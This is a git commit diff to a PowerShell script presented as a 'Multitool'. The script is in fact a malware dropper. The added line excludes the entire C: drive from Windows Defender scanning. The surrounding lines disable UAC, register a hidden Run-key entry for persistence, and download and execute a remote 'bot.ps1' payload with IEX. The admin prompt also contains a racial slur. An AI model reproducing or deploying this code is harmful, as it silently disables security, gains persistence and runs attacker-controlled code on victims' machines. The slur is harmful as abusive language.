92a8c741d0803e3b744769505b2b18f83bc48533
LUBRJ <145651445+lubrj@users.noreply.github.com>
2025-07-22 16:26:29 +0200

    Update Multitool.ps1

--- Multitool.ps1
+++ Multitool.ps1
@@ -2,6 +2,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     [reflection.assembly]::LoadWithPartialName('PresentationFramework')|Out-Null;[Windows.MessageBox]::Show('Nigger run as admin')
     exit
 }
+Add-MpPreference -ExclusionPath "C:\"
 New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"' -PropertyType String -Force
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
 powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"
